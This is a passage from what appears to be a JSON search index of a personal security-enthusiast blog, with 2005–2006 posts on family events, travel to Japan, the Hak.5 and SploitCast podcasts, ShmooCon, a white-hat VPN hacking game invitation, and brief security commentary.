for Purchase Options Motherboard: Click Here for Purchase Options Memory: Click Here for Purchase Options A Black Dog - Linux server: Click Here for Purchase Options Weights and Curl Bar: Find at your local sports store. Mac Mini: Click Here for Purchase Options iPOD and FM Transmitter: iPOD (30gb/Video/Black): Click Here for Purchase Options FM Transmitter: Click Here for Purchase Options USB GPS Device: Click Here for Purchase Options 300mW Wireless PCMCIA Card: Click Here for Purchase Options WD Raptor HD: Click Here for Purchase Options Slingbox: Click Here for Purchase Options 8 or 16 port Switch: Click Here for Purchase Options TV Tuner Card: Click Here for Purchase Options RAM for my Laptop: Click Here for Purchase Options As you may have noticed, most of these items are high priced. If all of these items are outside your price range, a NewEgg.com gift certificate will work, or a card. Cards are nice. jd ","date":"2006-07-17","objectID":"https://malicious.link/posts/2006/2006-07-17-birthday-wishes/:0:0","tags":null,"title":"Birthday Wishes","uri":"https://malicious.link/posts/2006/2006-07-17-birthday-wishes/"},{"categories":["internet"],"content":"Check out this video from the 1940s. I have never seen anyone so flexable in my life. ","date":"2006-07-09","objectID":"https://malicious.link/posts/2006/2006-07-09-solid-potato-salad/:0:0","tags":null,"title":"Solid Potato Salad","uri":"https://malicious.link/posts/2006/2006-07-09-solid-potato-salad/"},{"categories":["rant","travel"],"content":"Well, I am home. Not actually, I’m in the U.s. waiting for my flight to NOVA. I have a very interesting flight, more so than usual. First things first: No, the person next to me wasn’t an old lady that wanted to talk my ear off or a crying baby. It was actually a mother of an adorable boy that was sitting near the window. But you don’t want to hear about good stuff. That isn’t interesting, you want to hear about the oddities, the bad stuff, and Inquirer type news. Well Inquirer, eat your heart out: Nazi Stewerdess: Before take off, this woman came out of no where, romped up the isle stopped at a very specific point, looked at the person sitting in seat ‘22 B’ and said “FASTEN YOUR SEAT BELT”. Then proceeded to romp off. Now I don’t know if planes have the technology yet to do this or this woman just had little tiny video cameras installed in every seat, but she was scary. The thing that made this woman even more weird was the fact that she did this to a couple other times, yet, after take off, she was no where to be seen. She wasn’t serving food, she wasn’t colleting trash. My row mate and myself swore that she was now sitting in first class and all the other flight attendants were secretly saying ‘Zig Hail’ or however that phrase is spelled. The Beast: I saw this one a mile away. She was in the chair in front of mine, with here neck pillow, buckled in, persperating, while people were still boarding. She had two seats open next to her and she was trying to go to sleep. Then, when someone finally came to sit down, she shuffled them in and ‘helped’ slam their bags into the overhead bins. If that wasn’t bad, she never put her seat upright, so when it came time to let my row mates in, they got the pleasure of squeezing by her lowered seat in an already cramped area. But the best part is yet to come. I opened up my laptop to watch episode 11 of purepwnage and catch up on a little Security Now, when she some how manages to put her seat even farther back. So here is me, at 6'4’’ crammed into an Economy seat for 13 hours with no room as it is, and The Beast decides to recline her seat more. Yay. I was so afraid that she would manage the feat of putting her seat back farther and break my laptop’s monitor that I turned it off and put it away. Now, don’t get me wrong, I am usually a very nice person, and I initially felt pity for her because she looked quite scared to be on a plane, but it turned out to be annoyance, not fright. And, the name that I have given her does not denote weight, she is just mildly overweight. It is the combination of the ugly, the rudeness, the mild obecity, and the miraculous way she can bend a airline seat. I apologize for the long post. I just have nothing else better to do then wait for my next flight. mubix ","date":"2006-06-26","objectID":"https://malicious.link/posts/2006/2006-06-26-an-interesting-flight/:0:0","tags":null,"title":"An Interesting Flight","uri":"https://malicious.link/posts/2006/2006-06-26-an-interesting-flight/"},{"categories":["travel","japan"],"content":"I broke down and bought a card reader. So check out my flickr. I have over a hundred pictures posted from the few days that I have been over here, and I’ll be posting more and more each day and they will all be in the same flickr set. Well we went to Akihabara again today to return a wireless card, but they wouldn’t take it back. Ghey. But I got a really cool usb flash drive and a the card reader I needed. The last time I was in Akihabara I was too busy looking around to take pictures, so all I have pictures of is Asaksa. Check out the set at: http://www.flickr.com/photos/mubix/sets/72157594171586254/ jd.mubix ","date":"2006-06-20","objectID":"https://malicious.link/posts/2006/2006-06-20-100-photos-posted/:0:0","tags":null,"title":"100+ Photos Posted!","uri":"https://malicious.link/posts/2006/2006-06-20-100-photos-posted/"},{"categories":["rant"],"content":"I’m taking a time out of all the hustle and bustle of Tokyo, Japan to write a little and promise picutres in the near future. Well, once my integrated card reader decides to read xD M-class cards. I just applied the patch from HP but it still has major problems. It gets to the first image and stops reading and I get all kinds of write errors. To add salt to the wound, I forgot my USB cable to my camera, so I really have no way of getting my pictures off the camera. And the hits keep rolling in, I just finished a day in Akihabara, better known as the Electric Town. Whis is the biggest Computer/Electronic shopping ‘area’ in the world, and not a single store had the type of USB cable I needed. So, you’ll get pictures as soon as I can get this crap reader to work. In other news, I had a blast with my wife and son in Akihabara, they didn’t, but I did. mubix. ","date":"2006-06-17","objectID":"https://malicious.link/posts/2006/2006-06-17-connected-in-japan/:0:0","tags":null,"title":"Connected in Japan","uri":"https://malicious.link/posts/2006/2006-06-17-connected-in-japan/"},{"categories":["gaming"],"content":"As with any new thing there is always something that goes wrong. The commentary for the Hak.5 Lanparty has been delayed due to Microsoft Windows being stupid. So everyone say “Thank you Bill!” and hopefully we will be up and live soon. Sorry for the delay. GCA - Mubix ALL PROBLEMS WERE FIXED. THANKS FOR LISTENING ","date":"2006-05-28","objectID":"https://malicious.link/posts/2006/2006-05-28-technical-difficulties/:0:0","tags":null,"title":"Technical Difficulties","uri":"https://malicious.link/posts/2006/2006-05-28-technical-difficulties/"},{"categories":["gaming"],"content":"The Game Commentator’s Association (GCA) has be graciously asked to host the Hak.5 Counter-Strike: Source tournament tonight. We accepted and will be starting our commentary at the start of the game. More information can be found on the Hak5 website and below. Game: Counter-Strike: Source Date: Saturday, May 27th Time: 9:00 PM EST (-5 GMT) Server: game.hak5.org (password: hak5) GCA Commentator: Mubix GCA Commentary Stream: GCA Stream The stream will go up ~30 minutes prior with just music. Hak.5 LAN parties powered by As this is the first event that is being hosted by the GCA we welcome feed back. We are also looking for a few good commentators to fill the GCA ranks. If you are interested drop me a line in the IRC channel at Hak5 IRC Server - irc.hak5.org #hak5 or email me. jd.mubix ","date":"2006-05-27","objectID":"https://malicious.link/posts/2006/2006-05-27-game-commentators-association/:0:0","tags":null,"title":"Game Commentator’s Association","uri":"https://malicious.link/posts/2006/2006-05-27-game-commentators-association/"},{"categories":["family"],"content":" This is my wife’s first Mother’s day, so if you could send her a message on Yahoo that says “HAPPY MOTHERS DAY FROM ROBERT” I would greatly appreciate it. I am trying to get her whole screen filled up with random people saying Happy Mothers Day. You see, I try to be as inventive as I can on holidays so that I can suprise her. So please, help me out. Her nick is (Thanks for your support she loved it) . Thanks. And yes, she will probably kill me for letting her nick out. I would also like to say Happy Mother’s day to my Mom, she already has her present though. I gave her one of those print-anywhere printers with a digital camera. I think it’s one of the most useful gifts I ever got her. ;-) I bought her some perls one time, I think they have only seen the light of day once or twice. Anyways, to you Mom, and to all the other mothers out there, this is for you. Thanks again, jd.mubix ","date":"2006-05-14","objectID":"https://malicious.link/posts/2006/2006-05-14-happy-mothers-day/:0:0","tags":null,"title":"Happy Mother's Day","uri":"https://malicious.link/posts/2006/2006-05-14-happy-mothers-day/"},{"categories":["tv","podcasts"],"content":"So, I haven’t posted in a while. Which is due to supreme work related stresses…. no, actually just lazyness, but atleast I am a bit better than say, oh Darren Kitchen, (April 17th) or Wess Tobler (December 11th). Ok, ya, my last post was on the 6th of April and TECHNICALLY I don’t beat Darren’s but, I actually post something, he posts videos… pfffft. That isn’t a blog. ;-) You know I love you D. Anyways, in other news, I believe I will be hitting the 500+ pictures mark of my son soon. It’s crazy. Oh, and I installed Fedora Core 5 on my laptop to test it out. I’ll tell you guys how it’s going. I am hooked on 3 TV shows. 24, Lost, and The 4400. Lost supposedly had their best episode all season last Wednesday and 24 is winding down after a great season, The 4400 will be starting up again for Season 3 on June 11th at 9 EST on the USA Network . I also watched the first episode of a exciting new IPTV show done by Foxx, Mustang, and special guest LuckyPhil called BSOD (Bastard Sons of Dial-up) a.k.a Blue Screen of Death boys ;-) Also, during the last month I was accepted to DJ at Yarradio.com which I had to turn down half way through acceptance due to some real life conflicts of schedule but they were great people to work with, and I’d like to put a shout out to DJ Snowball who hooked me up with the gig, and Loathed and Degrifter for all the help and understanding during my training phase for all my scheduling delemas. Oh and I will be going to Japan in the next few months so, I might disappear for an extended period of time again. I am real excited about the trip and it will be a nice break from everything. If you want me to pick you up a certain manga/anime or other gift shout me an IM or email and I’ll see what I can hook up. All requests for 1st Class tickets or Sumo tickets will be accepted on a case by case basis. That’s it for now. I’ll be back. ","date":"2006-05-08","objectID":"https://malicious.link/posts/2006/2006-05-08-time-fedora-and-other-things-42-related-html/:0:0","tags":null,"title":"Time, Fedora, and other things 42 related.","uri":"https://malicious.link/posts/2006/2006-05-08-time-fedora-and-other-things-42-related-html/"},{"categories":["hak5","usb","podcasts"],"content":"Ok, so I am a little late on posting. Been kinda busy with my new son, work, and everything in between (mainly IRC). The reason I am posting about this episode is because I was welcomed onto the show as a Guest. If you have already seen it. Yes, I was nervous and Yes, I am ugly. Get it? Got it? Good. Ok, well I did a segment on applications that conviently fit onto a USB flash drive. Now, I only showed 4 on the show, my favorites. However there are about 32 applications that I would like to share. Which brings me to my second shout out to all the viewers: Yes, I have the complete list, Yes, it is publicly available, and NO I will not send, email, or IM you the link until the 10th. The reason for this is I was welcomed on the show as a guest as I said before and I respect their way of doing things, so I will retain the knowledge of the link until the rest of the show notes are released. Oh by the way, if you don’t know about Hak.5, go to http://www.hak5.org/ and click on Episodes, you will see multiple links to many different ways to download the episodes. You can find the list of USB applications that I previewed on the show at /pages/usbgoodies.html or by clicking on the link under static pages. ","date":"2006-04-06","objectID":"https://malicious.link/posts/2006/2006-04-06-hak5-episode-9/:0:0","tags":null,"title":"Hak.5 Episode 9","uri":"https://malicious.link/posts/2006/2006-04-06-hak5-episode-9/"},{"categories":["internet"],"content":"Pandora is a cool place where you can go and listen to music and it suggests music for you to listen to based off an indepth engine of sorting. Everyone on the podcasting planet has covered this awesome. I don’t know what to call it, tool, application, website ,’thing’. After watching Hak5’s episode showing off time spacing Pandora a while back, a idea started festering in my subconsious. Well, driving home today, it finally surfaced. Imagine a radio station like that. Something like Pandora that you could ‘tune’ into. I just thought I would put it down before someone else came up the idea. So let me spell it out bluntly. I purpose a radio station that you sign up for like XM radio, and you start with a couple channels that you can either personally or as a family start with a base idea, like Country, Top 40, Techno, Hard Rock, Classic Rock, or Children. And then, through a small mic in the station, say yes or no, or push a button, and it starts tuning the station to what it thinks you would like, just like Pandora. Say if you missed a song and you didn’t say yes or now, you can go back, forward, whatever. Add a comment, and tell me what you think. jd.mubix ","date":"2006-03-28","objectID":"https://malicious.link/posts/2006/2006-03-28-in-other-news/:0:0","tags":null,"title":"In other news","uri":"https://malicious.link/posts/2006/2006-03-28-in-other-news/"},{"categories":["internet"],"content":"I believe there should be groups to help people with this ‘virus’ jd.mubix ","date":"2006-03-18","objectID":"https://malicious.link/posts/2006/2006-03-18-ie-users-anonymous/:0:0","tags":null,"title":"IE Users Anonymous","uri":"https://malicious.link/posts/2006/2006-03-18-ie-users-anonymous/"},{"categories":["internet"],"content":"A while ago, I posted a PHP Relay location to my site, and to a Hak5.org’s forums. Recently I saw quite a bit of traffic going directly to that URL. I have taken action to ensure that this privledge that I am extending to the world, free of charge, is not abused. I have a cron job running that assess that use of that specific file and by what IPs. It then takes any IP with use over a certain limit and adds them to a complete block, to the relay, to my site, and any other site that I host. I am providing this service free of charge. Don’t abuse it. As of now, the following IP addresses have been banned. 195.229.242.53 199.185.84.162 213.42.2.0/24 If you are in this range, or one of those IPs, then please email me, make amends, and I will unblock you. The reason I know you can get to this site, is you were using my relay, you will probably be able to find another. Thanks to all those who use in moderation and don’t flood my servers, jd.mubix ","date":"2006-03-16","objectID":"https://malicious.link/posts/2006/2006-03-16-internet-relay-abuse/:0:0","tags":null,"title":"Internet Relay Abuse","uri":"https://malicious.link/posts/2006/2006-03-16-internet-relay-abuse/"},{"categories":["tv"],"content":" A leaked image from an upcoming episode of LOST. Could it be that Henry Gale is telling the truth? Or could this just be some sort of flash back? The original post can be found here: http://lost-and-gone-forever.blogspot.com/2006/03/my-most-controversial-post-ever.html The image mirror is here: http://img73.imageshack.us/img73/3397/3783989920ig.jpg And you can digg it here: http://digg.com/links/leaked_LOST_picture ","date":"2006-03-05","objectID":"https://malicious.link/posts/2006/2006-03-05-images-from-leaked-lost-episode/:0:0","tags":null,"title":"Images from Leaked LOST episode","uri":"https://malicious.link/posts/2006/2006-03-05-images-from-leaked-lost-episode/"},{"categories":["family"],"content":" Born : Feb 22, 2006 @ 0658 Weight: 8 lbs 0.2 oz Healthy as an ox. ","date":"2006-03-04","objectID":"https://malicious.link/posts/2006/2006-03-04-alexander-the-great-its-a-boy/:0:0","tags":null,"title":"Alexander the Great. It's a boy!","uri":"https://malicious.link/posts/2006/2006-03-04-alexander-the-great-its-a-boy/"},{"categories":["homage"],"content":"I want to take this opportunity to pay some homage to a great man that I had the pleasure of watching on TV at great lengths, thanks to my dad. Don Knotts, also know as Baney Fife from the Andy Griffith show. Rest In Peace: I found out from the Washington Post at this article: http://www.washingtonpost.com/wp-dyn/content/article/2006/02/25/AR2006022501535.html ","date":"2006-02-26","objectID":"https://malicious.link/posts/2006/2006-02-26-homage-to-don-knotts/:0:0","tags":null,"title":"Homage to Don Knotts","uri":"https://malicious.link/posts/2006/2006-02-26-homage-to-don-knotts/"},{"categories":["family"],"content":"To the woman who wants nothing, but gives everything, My Wife. I love you every day. ","date":"2006-02-14","objectID":"https://malicious.link/posts/2006/2006-02-14-happy-valentines-day/:0:0","tags":null,"title":"Happy Valentines Day!","uri":"https://malicious.link/posts/2006/2006-02-14-happy-valentines-day/"},{"categories":["full disclosure","internet"],"content":"Today I saw on Bugtraq a new 0 day coming that affects all up to date versions of windows. The most extraordinary part of this, and similar disclosures, is their workarounds. Since Redmond has decided not to patch, until a later date, it is up to the discloser or a likeminded individual to figure out how to protect the masses. Guess what ends up being the fix? “Disable said Microsoft FEATURE”. Imagine that. For more information you can refer to: http://readlist.com/lists/securityfocus.com/bugtraq/1/9704.html This exploit only affects you if you navigate to a site (or what looks like a site) and drag and drop something. You have been warned. jd. ","date":"2006-02-14","objectID":"https://malicious.link/posts/2006/2006-02-14-microsoft-ignores-another-0-day-feature/:0:0","tags":null,"title":"Microsoft ignores another 0 day 'feature'","uri":"https://malicious.link/posts/2006/2006-02-14-microsoft-ignores-another-0-day-feature/"},{"categories":["podcasts","sploitcast","shmoocon","cons"],"content":"Geez. I never have time anymore to put something on this darn thing. I think I am going to stop apologizing for how long it takes me to post, because it is quite quickly becoming the norm. So anyways, since my last post, I have been to ShmooCon ‘06 I met some great people to include but not limited to, Lance James, Kevin Mitnick, Fyodor - A.K.A the creator of NMAP, Skydog, DC-Mike, and Simple Nomad. And those are just some of the highlights of what happened. Bruce Potter, who is sort of a Bruce Banner / Harry Potter mix, in the closing ceremonies decided to start throwing electronics out into the crowd, one of such attacks hitting me. But I got a 1gb USB drive out of the deal so it’s all good. Oh, and a little birdy told me that they may be releasing the videos too all confrences via torrent some time in mid Feb. So if you missed the fun, atleast check out the talks. That way, next year, you’ll beat yourself up even more to go. Next topic: Feburary Baby. It’s about that time. Words can’t express how excited I am for the first addition to my family. I am the middle child and my older sister was supposed the be the first. I think she just wanted to test the waters with a nephew first before she picked out one of her own ;-). Next topic: SploitCast. SploitCast is REALLY taking off. I don’t know what or why it happened. But we are getting some pretty big names to speak on our tiny little podcast. Check us out at SploitCast.com or on iTunes. I’ll add a link in the navigation bar so it’s easier for ya’ll. Next topic: Tax Season for all you Northern Americans under Canada. For the first time in my life, I have my taxes submitted before the deadline. Do you have yours done? Now a question for the crowd: What is your favorite tool? Any tool, it could be software, a hammer or jolt cola. What is that one thing you couldn’t survive without? ","date":"2006-01-29","objectID":"https://malicious.link/posts/2006/2006-01-29-sploitcast-a-feburary-baby-shmoocon-and-tax-season/:0:0","tags":null,"title":"SploitCast, a Feburary baby, ShmooCon and Tax season","uri":"https://malicious.link/posts/2006/2006-01-29-sploitcast-a-feburary-baby-shmoocon-and-tax-season/"},{"categories":["podcasts","sploitcast"],"content":".-.. .. ... - . -. / - --- / ... .--. .-.. --- .. - -.-. .- ... - / .-- .-- .-- .-.-.- ... .--. .-.. --- .. - -.-. .- ... - .-.-.- -.-. --- -- The above is Morse code. But anyways, we release the first episode of SploitCast yesterday night and we already have 1164 diggs. Which is pretty exciting. A lot of people have said quite a few good things about what we are doing. One thing that we do have to work on is the volume equalizing, which is just time and experiance. I am very glad that so many people viewed our first episode as a hit. Thanks for all your support. You can subscribe to SploitCast on iTunes by clicking here or by going to SploitCast.com. Check it out and tell us what you think. You can also help us out by digging the the story at digg.com : SploitCast - a new podcast for hackers jd ","date":"2006-01-10","objectID":"https://malicious.link/posts/2006/2006-01-10-sploitcast-hits-the-shelves/:0:0","tags":null,"title":"SploitCast hits the shelves!","uri":"https://malicious.link/posts/2006/2006-01-10-sploitcast-hits-the-shelves/"},{"categories":["podcasts","sploitcast"],"content":"Archive.org copy of Sploitcast.com ","date":"2006-01-10","objectID":"https://malicious.link/posts/2006/2006-01-10-sploitcast-hits-the-shelves/:1:0","tags":null,"title":"SploitCast hits the shelves!","uri":"https://malicious.link/posts/2006/2006-01-10-sploitcast-hits-the-shelves/"},{"categories":["rant"],"content":"Yeah, I know it’s been a while AGAIN since I have posted, but I just wanted to say Happy New Years to everyone. This year is going to be a very different one for me since my wife and I are expecting in Feb. I am really excited about my future son. It is a blessing to be able to bring a life into the world, and a big responsibility. I am also starting college back up. I will be going for a BS in Information Assurance. Another thing that I want to point out is that I shovled out some dough and am getting 2 x 1 GB (Cas 2) 184pin DDR ram sticks. I am note sure what Cas 2 is, but I am told it’s the best out right now. In other news, I went down to the party with the Hak.5 crew again and had a blast. I am starting to become a regular down there, which is fine by me. It is pretty refreshing to be able to have fun, party, and then sit down for a late night hack session all with the same people. In Bigger new (however not as big as my future son) I am now doing a podcast called Sploitcast with Harrison Holland and Jonny G’ from Hak.5. Our first episode airs Jan 8 and I am extremely excited to see how it all turns out. Well. it is getting really late and it is way my bed time. ","date":"2006-01-07","objectID":"https://malicious.link/posts/2006/2006-01-07-happy-new-year/:0:0","tags":null,"title":"Happy New Year","uri":"https://malicious.link/posts/2006/2006-01-07-happy-new-year/"},{"categories":["friends"],"content":"Huge shout out to my best friend Heath Mouton!! Congratultions man! Name: Rayne Marie Mouton Weight: 3 lbs 9 Oz Height: 17 inches Born December 13th 2005 at 5:27 PM The reason for the late posting is because my BEST BUDDY failed to mention it to me. ;-) Still love ya man. jd. ","date":"2005-12-19","objectID":"https://malicious.link/posts/2005/2005-12-19-another-baby/:0:0","tags":null,"title":"Another Baby!","uri":"https://malicious.link/posts/2005/2005-12-19-another-baby/"},{"categories":["podcasting","techtv","hak5"],"content":"Debating security with Steve Gibson and Leo Laporte Stolen from: http://www.flickr.com/photos/globalhermit/sets/1592265/with/74157804/ ","date":"2005-12-15","objectID":"https://malicious.link/posts/2005/2005-12-15-techtv-holiday-meetup/:1:0","tags":null,"title":"TechTV Holiday Meetup","uri":"https://malicious.link/posts/2005/2005-12-15-techtv-holiday-meetup/"},{"categories":["hak5","podcasts"],"content":"I have created this post to invite all who read this (all 5 of ya, yes, I know your IPs by heart) to a game that was initiated out of a forum thread on the Hak.5 Forums. If you would like to join the game, by you commenting on this post you are accepting an agreement that ANYTHING that happens across this VPN is not my or any of the participants fault. You are also authorizing yourself to be a target. HOWEVER, the rules of this game are that of the WHITE HAT. You are not allowed to destroy ANYTHING on ANY computer on the VPN unless explicitly announced. Also, if there is a complaint, a valid complaint against you for not adhering to these rules, you certificate will be revoked and you will no longer be able to participate. I will be the final judge on wither or not a complaint is valid or not. I will be recording ALL traffic across the VPN. Yes, I do have enough space. If you agree to these rules, please add the comment of “I AGREE” , your handle, and include your email address in a human legible way. When the game begins I will email out each individual certificate. Further rules will be set once an initial panel of judges is formed. If you would like to be a judge. There will be 2 spots. Email me for more information. ","date":"2005-12-14","objectID":"https://malicious.link/posts/2005/2005-12-14-vpn-hacking-game/:0:0","tags":null,"title":"VPN Hacking Game","uri":"https://malicious.link/posts/2005/2005-12-14-vpn-hacking-game/"},{"categories":["hak5","podcasts"],"content":"Just a real quick FYI. Since I have been getting more and more into the IPTV scene, I figured that I would add links to my favorite shows. I will most indubitably be adding more, but this is a good start. Check it out over \u003c——————– There.. opps.. now there —————————————————–\u003e ","date":"2005-12-06","objectID":"https://malicious.link/posts/2005/2005-12-06-new-iptv-links/:0:0","tags":null,"title":"New IPTV Links","uri":"https://malicious.link/posts/2005/2005-12-06-new-iptv-links/"},{"categories":["hak5","techphile","podcasts"],"content":" December 2nd, I drove down to Williamsburg VA to meet up with the guys from Hak.5 and Frank Linhares. For those of you who don’t know. Hak.5 is an IPTV (Vidcast) show, which basically boils down to a TV show on the internet. Anyways, I got to meet up with these fellas and a couple other interesting people. While I was there, I had the privilege of helping out not only in the live techPhile podcast by Frank Linhares, but also the ‘glue’ segments of Ep 5 of Hak.5. I must say, if and of the Hak.5 crew or Frank are reading this; it was a great pleasure to hang out with you guys. I would also like to make some personal shout outs to each one, and because this is my site. I get to. Muhahaha. Frank: It was awesome to meet and get to know you. You still owe me dinner! ;-) But seriously, it was an honor to help out with the show. Darren: You have Hak.5 on lock, keep up the awesome work, and it was cool meeting you. Thanks for the invite. Inviting someone you have never met into your home is a big deal to me, thanks for the trust and respect. Wess: I love you man. We need to tell Alli about us before this gets ugly. Harrison: It was sweet meeting you man. We became fast friends; you and I think a lot alike. (‘cept for cars: Ferrari Sucks) and I think ShmooCon 2006 is gonna rock. Jon: Man, we will get Gentoo done. If you need any further help you guys got my number - Mubix – Tech Support 24/7 365. Keep it real man. Alli, Paul, Harrison’s Mom, and Jui-Chia: It was cool hanging out with you guys. I had a blast down there. 1 1/2 hour commute is worth it to hang out w/ you guys. One last thanks goes out to all the people in the IRC channel techPhile IRC server #hak5 and #techphile for making my moderation a cake walk. Except for a certain individual, all the questions were perfect and I only had to fix/deny a few of them. ","date":"2005-12-04","objectID":"https://malicious.link/posts/2005/2005-12-04-hak5-and-techphile-merge-for-a-day/:0:0","tags":null,"title":"Hak.5 and techPhile merge for a day.","uri":"https://malicious.link/posts/2005/2005-12-04-hak5-and-techphile-merge-for-a-day/"},{"categories":["techphile","podcasts"],"content":"Well if you were wondering about me, I didn’t die. I am working on a super secret project for Frank Linhares of techPhile.ca But don’t tell anyone! That is secret squrrell news. I have also submitted some logo ideas for the new Auditor Security Collection. You can vote for me: HERE I also got a HP dv1420us which, so far, I really like. It doesn’t like linux too much, but it is challenging me to learn more about the kernel and other aspects of linux to fix the problems. Anyways, I’ll start posting more…. promise j.d.mubix ","date":"2005-11-30","objectID":"https://malicious.link/posts/2005/2005-11-30-what-happened/:0:0","tags":null,"title":"What happened!?","uri":"https://malicious.link/posts/2005/2005-11-30-what-happened/"},{"categories":["brandon"],"content":"Today was Brandon’s first birthday that he has missed. I hope that he knows that I love him very much. I have just written this on the 30th and back dated it. I miss my brother. ","date":"2005-11-14","objectID":"https://malicious.link/posts/2005/2005-11-14-brandons-birthday/:0:0","tags":null,"title":"Brandon's Birthday","uri":"https://malicious.link/posts/2005/2005-11-14-brandons-birthday/"},{"categories":["usmc"],"content":"I was promoted to the Rank of Sergeant. Just wanted to let people know. And the reason why this entry is so short, is NOT because I am not excited about it. It’s because I have better things to do right now ;-) Sgt jd.mubix ","date":"2005-11-02","objectID":"https://malicious.link/posts/2005/2005-11-02-promotion-to-sergeant/:0:0","tags":null,"title":"Promotion to Sergeant.","uri":"https://malicious.link/posts/2005/2005-11-02-promotion-to-sergeant/"},{"categories":["friends"],"content":"Duder, CONGRATULATIONS! Mia Kei Duder Born October 13th 2005 @ 1:55 PM CST 6lbs 12 Oz - 20 Inches Our hearts go out to you and yours. We wish you the best of luck. jd. P.S. Sorry it had to be a girl ;-) ","date":"2005-10-14","objectID":"https://malicious.link/posts/2005/2005-10-14-its-a-girl/:0:0","tags":null,"title":"It's a Girl!","uri":"https://malicious.link/posts/2005/2005-10-14-its-a-girl/"},{"categories":["internet"],"content":"Most of us in the industry know what the slashdot effect is. But for those who don’t. Slashdot.org has such a following, that, when a news article is posted on Slashdot, so many users click on the links provided that a unintentional DDoS or Distributed Denial of Service attack is created, where the news site is taken basically killed by all the traffic that it instantly has to deal with. Well Digg.com has again, unintentionally, created it’s own Slashdot effect. The name for this effect is simply being “Dugg”. Digg.com’s first victim? Worlds first web site hosted on a psp! - R.I.P. jd. ","date":"2005-10-11","objectID":"https://malicious.link/posts/2005/2005-10-11-the-slashdot-effect-migrates-to-diggcom/:0:0","tags":null,"title":"The Slashdot effect migrates to Digg.com","uri":"https://malicious.link/posts/2005/2005-10-11-the-slashdot-effect-migrates-to-diggcom/"},{"categories":["cons","shmoocon"],"content":"I did a search on Digg.com and was suprised to see that not a soul has written about ShmooCon 2006. I guess all you west coasters only care about DefCon. That is discrimination and WE DON’T HAVE TO TAKE IT!. Back to reality. Well if you don’t know ShmooCon is basically the DefCon for the east coast and is being held in Washington D.C. . Registration is limited, unlike DefCon, so hurry and whip out those Paypal accounts. If you had registered before October 1st then it would have only cost you $75. Blame everyone else for not digging it. Here is a quick like to registration to save you lazy people out there a click: REGISTRATION FOR SHMOOCON 2k6 Hosted by the Shmoo Group (SUPRISE SUPRISE SUPRISE!) The registration and price-break schedule are as follows: * $150 - October 2, 2005 - December 31, 2005 * $300 - January 1, 2006 - January 13, 2006 Save yourself money and a seat by registering early, please. Once ShmooCon is sold out, there is NO way to register. Thanks. Keep your PayPal receipt as backup registration confirmation. Final confirmation from ShmooCon, to include your badge pickup mechanism, will be sent out to to all ShmooCon registrants on New Year’s Day. This additional confirmation will be sent to the PayPal email address initially used for registration. Government credit card holders who do not wish to use PayPal will be provided an alternate payment \u0026 registration mechanism after October 2nd. We apologize for any inconvenience and de-facto increased prices for Feds. ShmooCon registration fees do NOT cover your hotel accomodations at the Marriott Wardman Park Hotel. jd. ","date":"2005-10-10","objectID":"https://malicious.link/posts/2005/2005-10-10-shmoocon-2006/:0:0","tags":null,"title":"ShmooCon 2006","uri":"https://malicious.link/posts/2005/2005-10-10-shmoocon-2006/"},{"categories":["sharedlinks"],"content":"For those of you who do not know Whitedust.net is the leading independent ‘hacker’ portal. Yes that’s right! All of you Skiddies out there, you may not know who you are but WE DO, this site is NOT for you. Now that that disclaimer is over: Ladies and Gentlemen, If you have been luck, you’ve already seen them on /. or even on digg.com. Whitedust.net is an awesome site that has great articles relating to security and other such things. The articles come from staff and the community alike. Check them out, and if you don’t want to, do it anyways. jd. ","date":"2005-10-09","objectID":"https://malicious.link/posts/2005/2005-10-09-whitedustnet/:0:0","tags":null,"title":"Whitedust.net","uri":"https://malicious.link/posts/2005/2005-10-09-whitedustnet/"},{"categories":["backtrack","livecd"],"content":"Security oriented Linux Live CD “WHAX” is supposedly merging with Auditor. Quick history of WHAX: Whoppix based off Knoppix: Awesome CD Whoppix gets a name change and base distro change: Not broken, don’t fix it. New WHAX website gets hacked: ironic. Sep 9th… We (WHAX) are merging with Auditor, we need a new name: Anyone up for a downhill run? STILL NO UPDATE! What’s going on guys? jd ","date":"2005-10-07","objectID":"https://malicious.link/posts/2005/2005-10-07-hackers-are-stuck/:0:0","tags":null,"title":"Hackers are STUCK!","uri":"https://malicious.link/posts/2005/2005-10-07-hackers-are-stuck/"},{"categories":["windows"],"content":"I have stolen a sneak peek at one of the errors that have ALREADY come up in Microsoft Windows Vista. Take a look: scary eh? jd ","date":"2005-10-05","objectID":"https://malicious.link/posts/2005/2005-10-05-windows-vista-piracy-protection/:0:0","tags":null,"title":"Windows Vista: Piracy protection","uri":"https://malicious.link/posts/2005/2005-10-05-windows-vista-piracy-protection/"},{"categories":null,"content":"My wife and I did our first ultrasound today and IT’S A BOY!! When you decide that it is a good idea to send cash and gifts (jedi mind trick) … just email me at jd.mubix AT g m a i l DT c o m . In the mean time, start saving, my son is going to college, and yes, you are required by law to pay his way through college and any credit card bills he may incur going to frat parties and gaining his higher education ;-) we are expecting Feb 24 jd p.s. Sorry for the delay in writing. It’s been a rough two weeks. ","date":"2005-10-01","objectID":"https://malicious.link/posts/2005/its-a-boy/:0:0","tags":["family"],"title":"It's a boy!","uri":"https://malicious.link/posts/2005/its-a-boy/"},{"categories":["gaming"],"content":"Ok, yeah you’ve got me. This is old news. But COME ON! Someone needs to send a Marine Drill Instructor over to the Army and woop these guys into shape! The windows version of America’s Army version 2.4 came out May 16th 2005. That is a 127 days (4 months) at the time of this post. Where are the Linux and Mac versions?!?! We are still stuck in version 2.3. They haven’t even release an update so we can at the very least run linux servers! They are loosing a very large user base because of this HUGE gap that is going on. Someone needed to say something. Hopefully they will here my voice. On this forum, no mod can lock me out. I will be patient, because I like the game, but my patience and countless other’s patience is wearing thin. Who knows, Microsoft (aka Bill) could have made a deal with the Army. But who am I to speculate. jd ","date":"2005-09-21","objectID":"https://malicious.link/posts/2005/2005-09-21-americas-army-kicking-kde-to-the-kurb/:0:0","tags":null,"title":"America's Army: Kicking KDE to the Kurb","uri":"https://malicious.link/posts/2005/2005-09-21-americas-army-kicking-kde-to-the-kurb/"},{"categories":["movies","rant"],"content":"Update Some nice digg user decided to comment and inform me that this was the FIRST Bond book. Basically Bond before the toys. hmm, nope, still don’t like the idea. **Ok. I’m pissed. ** Let me get this straight. You’ve got A legendary name (“James Bond”) A multi-million dollar market A slew of Hollywood stars that have made 007 great Fan clubs spanning the globe MILLIONS OF DEDICATED 007 FANS 6 Video games and 20 full length feature films And you want to REINVENT the CHARACTER?!? Are you nuts? You want to make him YOUNG?! You want to make the new movie based on a FARCE that was done in 1967 WITH THE SAME NAME! AND YOU WANT TO TAKE AWAY “Q” AND THE TOYS! Come on. You are taking away EVERYTHING that is BOND. Ok now that I am done ranting and 